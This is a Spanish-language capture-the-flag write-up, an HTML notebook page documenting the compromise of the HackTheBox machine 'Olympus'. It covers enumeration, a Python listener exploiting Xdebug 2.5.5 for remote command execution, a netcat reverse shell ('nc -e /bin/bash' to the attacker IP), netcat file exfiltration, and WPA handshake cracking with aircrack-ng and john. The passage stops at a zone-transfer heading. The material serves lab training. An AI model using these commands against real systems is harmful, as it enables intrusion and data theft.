@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="" xml:lang="">
+<head>
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Olympus | 2021 - S4viNotes</title>
+  <meta name="description" content="Full Pentest notebook" />
+  <meta name="generator" content="bookdown 0.21 and GitBook 2.6.7" />
+
+  <meta property="og:title" content="Olympus | 2021 - S4viNotes" />
+  <meta property="og:type" content="book" />
+  
+  
+  <meta property="og:description" content="Full Pentest notebook" />
+  <meta name="github-repo" content="https://github.com/mlopez66/hacking-notes" />
+
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Olympus | 2021 - S4viNotes" />
+  
+  <meta name="twitter:description" content="Full Pentest notebook" />
+  
+
+<meta name="author" content="Lo0pInG 404" />
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+  
+  
+<link rel="prev" href="index.html"/>
+
+<script src="libs/jquery-2.2.3/jquery.min.js"></script>
+<link href="libs/gitbook-2.6.7/css/style.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-table.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-bookdown.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-highlight.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-search.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-fontsettings.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-clipboard.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+<script src="libs/accessible-code-block-0.0.1/empty-anchor.js"></script>
+
+
+<style type="text/css">
+code.sourceCode > span { display: inline-block; line-height: 1.25; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+</style>
+
+<link rel="stylesheet" href="assets/gitbook.css" type="text/css" />
+</head>
+
+<body>
+
+
+
+  <div class="book without-animation with-summary font-size-2 font-family-1" data-basepath=".">
+
+    <div class="book-summary">
+      <nav role="navigation">
+
+<ul class="summary">
+<li class="header-light">
+  <a class="logo" href="/">
+    <img src="assets/wr404-transparent.png" alt="LoOpInG 404" class="img-fluid">
+  </a>
+  <h1>Lo0pInG 404</h1>
+</li>
+
+<li class="divider"></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html"><i class="fa fa-check"></i>Preface</a><ul>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#introduction-1"><i class="fa fa-check"></i>Introduction</a></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#acknoledgement-1"><i class="fa fa-check"></i>Acknoledgement</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html"><i class="fa fa-check"></i>Olympus</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#introduccion"><i class="fa fa-check"></i>Introduccion</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#enumeracion"><i class="fa fa-check"></i>Enumeracion</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#reconocimiento-de-maquina-puertos-abiertos-y-servicios"><i class="fa fa-check"></i>Reconocimiento de maquina, puertos abiertos y servicios</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#empezamos-por-el-puerto-80"><i class="fa fa-check"></i>Empezamos por el puerto 80</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#vulnerability-assessment"><i class="fa fa-check"></i>Vulnerability Assessment</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#searchsploit"><i class="fa fa-check"></i>searchsploit</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#pruebas-del-exploit"><i class="fa fa-check"></i>Pruebas del exploit</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#exploitacion-de-la-vulnerabilida"><i class="fa fa-check"></i>Exploitacion de la vulnerabilida</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#vuln-exploit-gaining-access"><i class="fa fa-check"></i>Vuln exploit &amp; Gaining Access</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#ganando-accesso-con-la-vuln-xdebug"><i class="fa fa-check"></i>Ganando accesso con la vuln XDebug</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#tratamiento-de-la-tty"><i class="fa fa-check"></i>Tratamiento de la TTY</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#investigamos-la-maquina"><i class="fa fa-check"></i>Investigamos la maquina</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#airgeddon.cap-crack-with-aircrack-ng"><i class="fa fa-check"></i>Airgeddon.cap crack with Aircrack-ng</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#conneccion-a-la-maquina-victima"><i class="fa fa-check"></i>Conneccion a la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#investigacion-de-la-maquina-victima"><i class="fa fa-check"></i>Investigacion de la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#port-knocking"><i class="fa fa-check"></i>Port Knocking</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#privilege-escalation"><i class="fa fa-check"></i>Privilege Escalation</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#enumeracion-del-usuario-en-la-maquina-victima"><i class="fa fa-check"></i>Enumeracion del usuario en la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#escalacion-de-privilegios-con-docker"><i class="fa fa-check"></i>Escalacion de privilegios con Docker</a></li>
+</ul></li>
+</ul></li>
+<li class="divider"></li>
+<li class="summary-footer"><a class="logo" href="https://lopezmichel.org"><img alt="IPESE" src="assets/wr404-transparent.png"></a></li>
+
+</ul>
+
+      </nav>
+    </div>
+
+    <div class="book-body">
+      <div class="body-inner">
+        <div class="book-header" role="navigation">
+          <h1>
+            <i class="fa fa-circle-o-notch fa-spin"></i><a href="./">2021 - S4viNotes</a>
+          </h1>
+        </div>
+
+        <div class="page-wrapper" tabindex="-1" role="main">
+          <div class="page-inner">
+
+            <section class="normal" id="section-">
+<div id="olympus" class="section level1 unnumbered">
+<h1>Olympus</h1>
+<div id="introduccion" class="section level2 unnumbered">
+<h2>Introduccion</h2>
+<p>La maquina del dia 22/07/2021 se llama Olympus.</p>
+<p>El replay del live se puede ver en <a href="https://www.twitch.tv/videos/1094808182">Twitch: S4vitaar Olympus maquina</a></p>
+
+</div>
+<div id="enumeracion" class="section level2 unnumbered">
+<h2>Enumeracion</h2>
+<div id="reconocimiento-de-maquina-puertos-abiertos-y-servicios" class="section level3 unnumbered">
+<h3>Reconocimiento de maquina, puertos abiertos y servicios</h3>
+<div id="ping" class="section level4 unnumbered">
+<h4>Ping</h4>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="olympus.html#cb1-1"></a><span class="fu">ping</span> -c 1 10.10.10.83</span></code></pre></div>
+<p>ttl: 63 -&gt; maquina linux</p>
+</div>
+<div id="nmap" class="section level4 unnumbered">
+<h4>Nmap</h4>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="olympus.html#cb2-1"></a><span class="fu">nmap</span> -p- --open -T5 -v -n 10.10.10.83</span></code></pre></div>
+<p>Que lento madre mia…</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="olympus.html#cb3-1"></a><span class="fu">nmap</span> -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.83 -oG allPorts</span>
+<span id="cb3-2"><a href="olympus.html#cb3-2"></a><span class="ex">extractPorts</span> allPorts</span>
+<span id="cb3-3"><a href="olympus.html#cb3-3"></a><span class="fu">nmap</span> -sC -sV -p53,80,2222 10.10.10.83 -oN targeted</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Puerto</th>
+<th>Servicio</th>
+<th>Que se nos occure?</th>
+<th>Que falta?</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>53</td>
+<td>domain</td>
+<td>Domain zone transfer</td>
+<td>Un nombre de dominio</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>http</td>
+<td>whatweb, http-enum</td>
+<td>Checkear la web</td>
+</tr>
+<tr class="odd">
+<td>2222</td>
+<td>ssh</td>
+<td>conneccion a la maquina</td>
+<td>Usuario contraseña</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="empezamos-por-el-puerto-80" class="section level3 unnumbered">
+<h3>Empezamos por el puerto 80</h3>
+<div id="whatweb" class="section level4 unnumbered">
+<h4>Whatweb</h4>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="olympus.html#cb4-1"></a><span class="ex">whatweb</span> http://10.10.10.83</span></code></pre></div>
+<p>Nada interessante</p>
+</div>
+<div id="browsear-la-web" class="section level4 unnumbered">
+<h4>Browsear la web</h4>
+<p>Hay una imagen, se nos occure steganografia pero no hay nada.</p>
+<p>El Wappalyser no dice que el servidor web empleado es un Apache.</p>
+</div>
+<div id="wfuzz" class="section level4 unnumbered">
+<h4>WFuzz</h4>
+<p>Como no hay mucho mas que ver, applicaremos <strong>fuzzing</strong> para descubrir si hay mas rutas.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="olympus.html#cb5-1"></a><span class="ex">wfuzz</span> -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.83/FUZZ</span></code></pre></div>
+<p>No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="olympus.html#cb6-1"></a><span class="ex">wfuzz</span> -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.83/FUZZ.FUZ2Z</span></code></pre></div>
+<p>No hay nada.</p>
+</div>
+<div id="dig" class="section level4 unnumbered">
+<h4>Dig</h4>
+<p><strong>Dig</strong> a no confundir con dick ;) es una utilidad que nos permite recojer informaciones a nivel de dns.</p>
+<ol style="list-style-type: decimal">
+<li><p>Añadir la ip y el hostname en el /etc/hosts</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="olympus.html#cb7-1"></a><span class="ex">10.10.10.83</span> olympus.htb</span></code></pre></div></li>
+<li><p>Lanzar <strong>Dig</strong> para recojer informaciones</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="olympus.html#cb8-1"></a><span class="ex">dig</span> @10.10.10.83 olympus.htb</span></code></pre></div></li>
+</ol>
+<p>No hay respuesta valida lo que quiere decir que el dominio no es valido</p>
+</div>
+<div id="checkear-las-cabezeras-de-las-respuestas-a-lado-del-servidor" class="section level4 unnumbered">
+<h4>Checkear las cabezeras de las respuestas a lado del servidor</h4>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="olympus.html#cb9-1"></a><span class="ex">curl</span> -X GET -s <span class="st">&quot;http://10.10.10.83/&quot;</span> -I</span></code></pre></div>
+<div class="figure"><span id="fig:unnamed-chunk-2"></span>
+<img src="images/curl-xdebug.png" alt="curl xdebug" width="90%" />
+<p class="caption">
+Figure 1: curl xdebug
+</p>
+</div>
+<p>Algo interessante en la respuesta es el Xdebug 2.5.5. Xdebug es una extension de PHP para hacer debug con haremientas
+depuracion tradicionales, desde el editor, tal como se hace en lenguajes de programacion clasicos. Mas informaciones sobre
+Xdebug en <a href="https://desarrolloweb.com/articulos/que-es-instalar-configurar-xdebug.html">desarolloweb.com</a></p>
+
+</div>
+</div>
+</div>
+<div id="vulnerability-assessment" class="section level2 unnumbered">
+<h2>Vulnerability Assessment</h2>
+<div id="searchsploit" class="section level3 unnumbered">
+<h3>searchsploit</h3>
+<p>Checkeamos si existe un exploit relacionado con <strong>Xdebug 2.5.5</strong></p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="olympus.html#cb10-1"></a><span class="ex">searchsploit</span> xdebug</span></code></pre></div>
+<p>Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizando el exploit con el commando</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="olympus.html#cb11-1"></a><span class="ex">searchsploit</span> -x xdebug</span></code></pre></div>
+<p>Que hace el exploit?</p>
+<ul>
+<li>esta tirando de index.php</li>
+<li>se pone en escucha en el equipo de attackante en el puerto 9000</li>
+<li>usa el commando eval</li>
+<li>deposita en una ruta del servidor un fichero con su contenido en base64</li>
+<li>executa el fichero con php</li>
+<li>la peticion esta enviada por el methodo GET con <code>'Cookie' =&gt; 'XDEBUG_SESSION=+rand_text_alphanumeric(10)'</code></li>
+</ul>
+</div>
+<div id="pruebas-del-exploit" class="section level3 unnumbered">
+<h3>Pruebas del exploit</h3>
+<ol style="list-style-type: decimal">
+<li><p>Nos ponemos en escucha en el puerto 9000</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="olympus.html#cb12-1"></a><span class="ex">nc</span> -nlvp 9000</span></code></pre></div></li>
+<li><p>Enviamos un peticion GET con el XDEBUG_SESSION en cookie</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="olympus.html#cb13-1"></a><span class="ex">curl</span> -s -X GET <span class="st">&quot;http://10.10.10.83/index.php&quot;</span> -H <span class="st">&quot;Cookie: XDEBUG_SESSION=EEEEE&quot;</span></span></code></pre></div></li>
+</ol>
+<p>Recivimos datos del lado del servidor.</p>
+</div>
+<div id="exploitacion-de-la-vulnerabilida" class="section level3 unnumbered">
+<h3>Exploitacion de la vulnerabilida</h3>
+<p>Buscamos un exploit en github y encontramos un script cortito que vamos a modificar y llamar exploit_shell.py</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="olympus.html#cb14-1"></a><span class="co">#!/usr/bin/python3</span></span>
+<span id="cb14-2"><a href="olympus.html#cb14-2"></a></span>
+<span id="cb14-3"><a href="olympus.html#cb14-3"></a><span class="im">import</span> socket</span>
+<span id="cb14-4"><a href="olympus.html#cb14-4"></a><span class="im">import</span> pdb</span>
+<span id="cb14-5"><a href="olympus.html#cb14-5"></a></span>
+<span id="cb14-6"><a href="olympus.html#cb14-6"></a><span class="im">from</span> base64 <span class="im">import</span> b64encode</span>
+<span id="cb14-7"><a href="olympus.html#cb14-7"></a></span>
+<span id="cb14-8"><a href="olympus.html#cb14-8"></a>ip_port <span class="op">=</span> (<span class="st">&#39;0.0.0.0&#39;</span>, <span class="dv">9000</span>)</span>
+<span id="cb14-9"><a href="olympus.html#cb14-9"></a>sk <span class="op">=</span> socket.socket()</span>
+<span id="cb14-10"><a href="olympus.html#cb14-10"></a>sk.bind(ip_port)</span>
+<span id="cb14-11"><a href="olympus.html#cb14-11"></a>sk.listen(<span class="dv">10</span>)</span>
+<span id="cb14-12"><a href="olympus.html#cb14-12"></a>conn, addr <span class="op">=</span> sk.accept()</span>
+<span id="cb14-13"><a href="olympus.html#cb14-13"></a></span>
+<span id="cb14-14"><a href="olympus.html#cb14-14"></a><span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb14-15"><a href="olympus.html#cb14-15"></a>    client_data <span class="op">=</span> conn.recv(<span class="dv">1024</span>)</span>
+<span id="cb14-16"><a href="olympus.html#cb14-16"></a>    <span class="bu">print</span>(client_data)</span>
+<span id="cb14-17"><a href="olympus.html#cb14-17"></a></span>
+<span id="cb14-18"><a href="olympus.html#cb14-18"></a>    data <span class="op">=</span> <span class="bu">input</span>(<span class="st">&#39;&gt;&gt; &#39;</span>)</span>
+<span id="cb14-19"><a href="olympus.html#cb14-19"></a>    data <span class="op">=</span> data.encode(<span class="st">&#39;utf-8&#39;</span>)</span>
+<span id="cb14-20"><a href="olympus.html#cb14-20"></a>    conn.sendall(b<span class="st">&#39;ebal -i -- &#39;</span> <span class="op">+</span> b64encode(data) <span class="op">+</span> b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span></code></pre></div>
+<ol style="list-style-type: decimal">
+<li><p>Lanzamos el exploit</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="olympus.html#cb15-1"></a><span class="ex">python3</span> exploit_shell.py</span></code></pre></div></li>
+<li><p>Lanzamos una peticion GET</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="olympus.html#cb16-1"></a><span class="ex">curl</span> -s -X GET <span class="st">&quot;http://10.10.10.83/index.php&quot;</span> -H <span class="st">&quot;Cookie: XDEBUG_SESSION=EEEEE&quot;</span></span></code></pre></div></li>
+<li><p>En la mini shell abierta del exploit_shell.py lanzamos un <strong>whoami</strong></p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb17-1"><a href="olympus.html#cb17-1"></a><span class="fu">system</span><span class="ot">(</span><span class="st">&#39;whoami&#39;</span><span class="ot">)</span>    </span></code></pre></div></li>
+<li><p>En la respuesta del <strong>curl</strong> se nos pone <em>www-data</em></p></li>
+</ol>
+<p>El exploit functionna y el commando <strong>ifconfig</strong> nos da una ip que no es la 10.10.10.83. Quiere decir que estamos
+en un contenedor.</p>
+
+</div>
+</div>
+<div id="vuln-exploit-gaining-access" class="section level2 unnumbered">
+<h2>Vuln exploit &amp; Gaining Access</h2>
+<div id="ganando-accesso-con-la-vuln-xdebug" class="section level3 unnumbered">
+<h3>Ganando accesso con la vuln XDebug</h3>
+<ol style="list-style-type: decimal">
+<li><p>Nos ponemos en escucha con netcat</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="olympus.html#cb18-1"></a><span class="ex">nc</span> -nlvp 443</span></code></pre></div></li>
+<li><p>Con el exploit exploit_shell.py lanzamos una reverse shell</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="olympus.html#cb19-1"></a><span class="fu">system</span><span class="ot">(</span><span class="st">&#39;nc -e /bin/bash 10.10.14.20 443&#39;</span><span class="ot">)</span></span></code></pre></div></li>
+</ol>
+<p>De esta manera, hemos ganado accesso al equipo.</p>
+</div>
+<div id="tratamiento-de-la-tty" class="section level3 unnumbered">
+<h3>Tratamiento de la TTY</h3>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="olympus.html#cb20-1"></a><span class="ex">script</span> /dev/null -c bash</span>
+<span id="cb20-2"><a href="olympus.html#cb20-2"></a>^<span class="ex">Z</span></span>
+<span id="cb20-3"><a href="olympus.html#cb20-3"></a><span class="fu">stty</span> raw -echo<span class="kw">;</span> <span class="bu">fg</span></span>
+<span id="cb20-4"><a href="olympus.html#cb20-4"></a><span class="ex">-</span><span class="op">&gt;</span> reset</span>
+<span id="cb20-5"><a href="olympus.html#cb20-5"></a><span class="ex">-</span><span class="op">&gt;</span> xterm</span>
+<span id="cb20-6"><a href="olympus.html#cb20-6"></a><span class="bu">export</span> <span class="va">TERM=</span>xterm</span>
+<span id="cb20-7"><a href="olympus.html#cb20-7"></a><span class="bu">export</span> <span class="va">SHELL=</span>bash</span>
+<span id="cb20-8"><a href="olympus.html#cb20-8"></a></span>
+<span id="cb20-9"><a href="olympus.html#cb20-9"></a><span class="fu">stty</span> -a</span>
+<span id="cb20-10"><a href="olympus.html#cb20-10"></a></span>
+<span id="cb20-11"><a href="olympus.html#cb20-11"></a><span class="fu">stty</span> rows <span class="op">&lt;</span>rownb<span class="op">&gt;</span> columns <span class="op">&lt;</span>colnb<span class="op">&gt;</span></span></code></pre></div>
+</div>
+<div id="investigamos-la-maquina" class="section level3 unnumbered">
+<h3>Investigamos la maquina</h3>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="olympus.html#cb21-1"></a><span class="bu">cd</span> /home</span>
+<span id="cb21-2"><a href="olympus.html#cb21-2"></a><span class="co">#Output</span></span>
+<span id="cb21-3"><a href="olympus.html#cb21-3"></a><span class="ex">zeus</span></span>
+<span id="cb21-4"><a href="olympus.html#cb21-4"></a></span>
+<span id="cb21-5"><a href="olympus.html#cb21-5"></a><span class="fu">ls</span> /home/zeus</span>
+<span id="cb21-6"><a href="olympus.html#cb21-6"></a><span class="co">#Output</span></span>
+<span id="cb21-7"><a href="olympus.html#cb21-7"></a><span class="ex">airgeddon</span></span></code></pre></div>
+</div>
+<div id="airgeddon.cap-crack-with-aircrack-ng" class="section level3 unnumbered">
+<h3>Airgeddon.cap crack with Aircrack-ng</h3>
+<p>Airgeddon es una suite de utilidades para hacer auditorias wifi. Entrando en el repertorio airgeddon del usuario zeus encontramos
+otro repertorio llamado captured. Filtrando el contenido del directorio aigedon por ficheros <code>find \-type f</code> encontramos un fichero
+<strong>captured.cap</strong></p>
+<p>Vamos a transferir el fichero captured.cap a nuestro equipo de attackante</p>
+<ol style="list-style-type: decimal">
+<li><p>En la maquina de attackante</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="olympus.html#cb22-1"></a><span class="ex">nc</span> -nlvp 443 <span class="op">&gt;</span> captured.cap</span></code></pre></div></li>
+<li><p>En el contenedor</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="olympus.html#cb23-1"></a><span class="ex">nc</span> 10.10.14.28 443 <span class="op">&lt;</span> captured.cap</span></code></pre></div></li>
+</ol>
+<p>Saviendo que Airgeddon es una utilidad de auditoria wifi intentamos ver lo que contiene el <strong>captured.cap</strong> con la utilidad <strong>aircrack-ng</strong>.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="olympus.html#cb24-1"></a><span class="ex">aircrack-ng</span> captured-cap</span></code></pre></div>
+<div class="figure"><span id="fig:unnamed-chunk-3"></span>
+<img src="images/aircrack-airgeddon.png" alt="aircrack-ng sobre airgeddon capture" width="90%" />
+<p class="caption">
+Figure 2: aircrack-ng sobre airgeddon capture
+</p>
+</div>
+<p>Se ve un ESSID que se llama <code>To_cl0se_to_th3_Sun</code> que parrece turbio, y un handshake que significa que alguien a esperado que una victima se connecte
+o reconnecte tras un attaque de deauthentificacion y a recuperado el hash de authentificacion.</p>
+<p>Analizando la captura con <strong>tshark</strong> se ve que a sido un attaque de deauthentificacion</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="olympus.html#cb25-1"></a><span class="ex">tshark</span> -r captured.cap <span class="op">2&gt;</span>/dev/null</span></code></pre></div>
+<p>o filtrado por deauthentificacion</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="olympus.html#cb26-1"></a><span class="ex">tshark</span> -r captured.cap -Y <span class="st">&quot;wlan.fc.type_subtype==12&quot;</span> -Tfields -e wlan.da <span class="op">2&gt;</span>/dev/null</span></code></pre></div>
+<div id="crackeo-con-aircrack-ng" class="section level4 unnumbered">
+<h4>Crackeo con Aircrack-ng</h4>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="olympus.html#cb27-1"></a><span class="ex">aircrack-ng</span> -w /usr/share/wordlists/rockyou.txt captrured.cap</span></code></pre></div>
+<p>Este crack duraria aprox una hora.</p>
+<p>Con investigacion S4vi a pillado una palabra flight en un fichero .txt y buscando por el dios griego del vuelo
+encontro que este dios seria icarus.</p>
+<p>Para ganar tiempo, se crea un diccionario mas pequenito que contiene la palabra <em>icar</em></p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="olympus.html#cb28-1"></a><span class="fu">grep</span> <span class="st">&quot;icar&quot;</span> /usr/share/wordlists/rockyou.txt <span class="op">&gt;</span> dictionary.txt</span></code></pre></div>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="olympus.html#cb29-1"></a><span class="ex">aircrack-ng</span> -w dictionary.txt captured.cap</span></code></pre></div>
+<p>Ya encontramos la contraseña.</p>
+</div>
+<div id="crackeo-con-john" class="section level4 unnumbered">
+<h4>Crackeo con John</h4>
+<p>Extraemos lo que nos interressa del fichero <strong>captured.cap</strong> en un fichero mas pequenito que se llama Captura.hccap que con la utilidad
+<strong>hccap2john</strong> no permite transformarldo en un hash compatible con <strong>John</strong></p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="olympus.html#cb30-1"></a><span class="ex">aircrack-ng</span> -J Captura captured.cap</span>
+<span id="cb30-2"><a href="olympus.html#cb30-2"></a><span class="ex">hccap2john</span> Captura.hccap <span class="op">&gt;</span> hash</span>
+<span id="cb30-3"><a href="olympus.html#cb30-3"></a><span class="ex">john</span> -wordlist=/usr/share/wordlists/rockyou.txt hash</span></code></pre></div>
+</div>
+</div>
+<div id="conneccion-a-la-maquina-victima" class="section level3 unnumbered">
+<h3>Conneccion a la maquina victima</h3>
+<p>Ahora que tenemos un usuario potencial y una contraseña, intentamos connectar con ssh al puerto 2222</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="olympus.html#cb31-1"></a><span class="fu">ssh</span> icarus@10.10.10.83</span></code></pre></div>
+<p>Con la contraseña encontrada no nos functionna.
+Intentamos con el nombre turbio de esta red inalhambrica como contraseña.</p>
+<p><strong>Y PA DENTRO</strong></p>
+</div>
+<div id="investigacion-de-la-maquina-victima" class="section level3 unnumbered">
+<h3>Investigacion de la maquina victima</h3>
+<p>Hay un fichero que contiene un nombre de dominio valido <strong>ctfolympus.htb</strong></p>
+<p>Intentamos poner el nombre del dominio en el <code>/etc/hosts</code> pero la web sigue siendo la misma.</p>
+<p>Sabiendo que el puerto 53 esta habierto y teniendo ahora un nombre de dominio valido, podemos
+hacer un attacke de transferencia de zona con <strong>dig</strong></p>
+<div id="attacke-de-transferencia-de-zona-con-dig" class="section level4 unnumbered">
+<h4>Attacke de transferencia de zona con dig</h4>
